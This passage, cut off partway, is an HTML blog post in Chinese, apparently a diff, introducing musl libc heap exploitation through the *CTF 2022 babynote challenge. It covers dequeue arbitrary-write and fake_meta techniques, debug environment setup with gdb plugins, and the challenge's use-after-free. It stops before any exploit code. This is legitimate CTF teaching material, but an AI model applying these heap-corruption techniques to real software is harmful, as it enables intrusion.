@@ -1,0 +1,1497 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>通过*ctf2022_babynote入门musl Pwn - J4f&#39;s blog</title><meta name="author" content="J4f">
+<meta name="description" content="">
+  <meta itemprop="name" content="通过*ctf2022_babynote入门musl pwn">
+  <meta itemprop="datePublished" content="2026-01-10T02:01:48+08:00">
+  <meta itemprop="dateModified" content="2026-01-10T13:23:50+08:00">
+  <meta itemprop="wordCount" content="2495">
+  <meta itemprop="keywords" content="Pwn"><meta property="og:url" content="http://localhost:1313/posts/musl_pwn/">
+  <meta property="og:site_name" content="J4f&#39;s blog">
+  <meta property="og:title" content="通过*ctf2022_babynote入门musl pwn">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-01-10T02:01:48+08:00">
+    <meta property="article:modified_time" content="2026-01-10T13:23:50+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="通过*ctf2022_babynote入门musl pwn">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/1.jpg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/musl_pwn/" title="通过*ctf2022_babynote入门musl pwn - J4f&#39;s blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/read_qmgx/" title="《亲密关系》" /><link rel="next" type="text/html" href="http://localhost:1313/posts/read_jdsbj/" title="《基督山伯爵》" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/musl_pwn/index.md" title="通过*ctf2022_babynote入门musl pwn - J4f's blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "通过*ctf2022_babynote入门musl pwn",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/musl_pwn\/"
+    },"genre": "posts","wordcount":  2495 ,
+    "url": "http:\/\/localhost:1313\/posts\/musl_pwn\/","datePublished": "2026-01-10T02:01:48+08:00","dateModified": "2026-01-10T13:23:50+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "J4f"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="J4f&#39;s blog"><span class="typeit"><template>J4f&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="J4f&#39;s blog"><span class="typeit"><template>J4f&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>通过*ctf2022_babynote入门musl Pwn</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img class="avatar" src='/1.jpg' alt="J4f" height="16" width="16">&nbsp;J4f</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/pwn/" class="post-category" title="Category - Pwn"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwn</a></span></div><div class="post-meta-line"><span title="published on 2026-01-10 02:01:48"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2026-01-10">2026-01-10</time></span>&nbsp;<span title="Updated on 2026-01-10 13:23:50"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2026-01-10">2026-01-10</time></span>&nbsp;<span title="2495 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2500 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>12 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#环境配置">环境配置</a>
+      <ul>
+        <li><a href="#编译libc">编译<code>libc</code></a></li>
+        <li><a href="#启动题目">启动题目</a></li>
+        <li><a href="#调试">调试</a></li>
+      </ul>
+    </li>
+    <li><a href="#ctf星ctfbabynote">*CTF（星CTF）——Babynote</a>
+      <ul>
+        <li><a href="#漏洞">漏洞</a></li>
+        <li><a href="#流程">流程</a>
+          <ul>
+            <li><a href="#第一步">第一步</a></li>
+            <li><a href="#第二步">第二步</a></li>
+            <li><a href="#第三步">第三步</a></li>
+          </ul>
+        </li>
+        <li><a href="#exp">exp</a></li>
+      </ul>
+    </li>
+    <li><a href="#hkcertctf2025-_-compress">hkcertCTF2025 _ compress</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p><del>看到<code>hkcertctf</code>出了一道<code>musl</code>的题来学习一下</del></p>
+<h2 class="heading-element" id="前言"><span>前言</span>
+  <a href="#%e5%89%8d%e8%a8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>基础知识部分就不详细列出了，列出一些我的参考文章。<del>其实主要还是看源码</del></p>
+<ul>
+<li><a href="https://9anux.org/2024/01/17/musl/" target="_blank" rel="external nofollow noopener noreferrer">io板子</a></li>
+<li><a href="https://bbs.kanxue.com/thread-269533.htm" target="_blank" rel="external nofollow noopener noreferrer">源码分析</a></li>
+<li><a href="https://bbs.kanxue.com/thread-274640-1.htm" target="_blank" rel="external nofollow noopener noreferrer">主要参考文章：小小做题家之musl1.2.2的利用手法</a></li>
+</ul>
+<p>利用手法：</p>
+<ul>
+<li>dequeue：用于任意地址写</li>
+<li>queue：把<code>fake_meta</code>链入<code>active</code>链表，从而进行任意地址的堆块分配</li>
+<li>IO：有通过<code>puts</code>和<code>exit</code>触发的</li>
+</ul>
+<h2 class="heading-element" id="环境配置"><span>环境配置</span>
+  <a href="#%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="编译libc"><span>编译<code>libc</code></span>
+  <a href="#%e7%bc%96%e8%af%91libc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>拿到题目的<code>musl libc</code>版本之后，最好自己编译一个<code>musl libc</code>，使用自己编译的<code>libc</code>启动题目有符号表能支持调试（有的题目给的<code>libc</code>没有符号表就调试不了），调试的时候还能看到<code>musl</code>的源码知道哪里出错了</p>
+<div class="details admonition note open">
+    <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-pencil-alt" aria-hidden="true"></i>Note<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></div><div class="details-content">
+      <div class="admonition-content"><p>查看<code>musl libc</code>版本：</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./libc.so</span></span></code></pre></td></tr></table></div>
+</div>
+</div></div>
+    </div>
+</div>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">git clone https://github.com/kraj/musl.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> musl
+</span></span><span class="line"><span class="cl">git checkout v1.2.2
+</span></span><span class="line"><span class="cl"><span class="nv">CFLAGS</span><span class="o">=</span><span class="s2">&#34;-g -O0&#34;</span> ./configure --prefix<span class="o">=</span><span class="nv">$PWD</span>/install
+</span></span><span class="line"><span class="cl">make -j<span class="k">$(</span>nproc<span class="k">)</span>
+</span></span><span class="line"><span class="cl">make install</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>这样<code>musl/install/lib</code>下就有没去符号表的<code>libc.so</code></p>
+<h3 class="heading-element" id="启动题目"><span>启动题目</span>
+  <a href="#%e5%90%af%e5%8a%a8%e9%a2%98%e7%9b%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">patchelf --set-interpreter ../musl-libc/v1.2.2 ./pwn</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>然后exp中直接</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">p = process(&#34;./pwn&#34;)</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>即可</p>
+<p>如果没有<code>patchelf</code>，通过</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./libc.so ./pwn</span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>启动，会有点问题（虽然也不是不行）</p>
+<h3 class="heading-element" id="调试"><span>调试</span>
+  <a href="#%e8%b0%83%e8%af%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo apt install musl-dbgsym
+</span></span><span class="line"><span class="cl">git clone https://github.com/xf1les/muslheap.git  
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;source /path/to/muslheap.py&#34;</span> &gt;&gt; ~/.gdbinit</span></span></code></pre></td></tr></table></div>
+</div>
+</div><div class="table-wrapper">
+  <table>
+    <thead>
+        <tr>
+            <th>命令</th>
+            <th>作用</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>mheap</td>
+            <td>可以查看<code>__malloc_context</code>的部分信息，可以详细看到每一条<code>meta</code>链表</td>
+        </tr>
+        <tr>
+            <td>p/x __malloc_context</td>
+            <td>可以查看<code>__malloc_context</code>的详细信息，但无法详细看到每一条<code>meta</code>链表</td>
+        </tr>
+        <tr>
+            <td>mmagic</td>
+            <td>用于查看关键函数的地址</td>
+        </tr>
+        <tr>
+            <td>p/x <em>(struct meta</em>) &lt;meta地址&gt;</td>
+            <td>查看某个<code>meta</code>结构体的详细信息</td>
+        </tr>
+        <tr>
+            <td>p/x <em>(struct group</em>) &lt;group地址&gt;</td>
+            <td>查看<code>group</code>结构体详细信息</td>
+        </tr>
+        <tr>
+            <td>mchunkinfo <addr></td>
+            <td>查看某个用户指针所属 <code>slot </code>的详细信息</td>
+        </tr>
+        <tr>
+            <td>mfindslot  <addr></td>
+            <td>从任意地址反向定位其所在 <code>slot</code></td>
+        </tr>
+        <tr>
+            <td>p/x stdout</td>
+            <td>查看<code>stdout</code>结构体</td>
+        </tr>
+        <tr>
+            <td>p/x <em>(struct meta_area</em>) &lt;meta_area address&gt;</td>
+            <td>查看<code>meta_area</code>，<code>meta &amp; 0xffffffffffff000</code>就能找到<code>meta_arena</code>结构体</td>
+        </tr>
+    </tbody>
+  </table>
+</div><h2 class="heading-element" id="ctf星ctfbabynote"><span>*CTF（星CTF）——Babynote</span>
+  <a href="#ctf%e6%98%9fctfbabynote" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><a href="https://github.com/sixstars/starctf2022/tree/main/pwn-BabyNote" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/sixstars/starctf2022/tree/main/pwn-BabyNote</a></p>
+<p>逆向分析，略。。。</p>
+<h3 class="heading-element" id="漏洞"><span>漏洞</span>
+  <a href="#%e6%bc%8f%e6%b4%9e" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><code>add</code>的时候，把<code>global_note</code>给了<code>heap_ptr[4]</code>，<code>delete</code>的时候，没有把<code>heap_ptr[4]</code>中的<code>global_note</code>置0，存在<code>UAF</code></p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
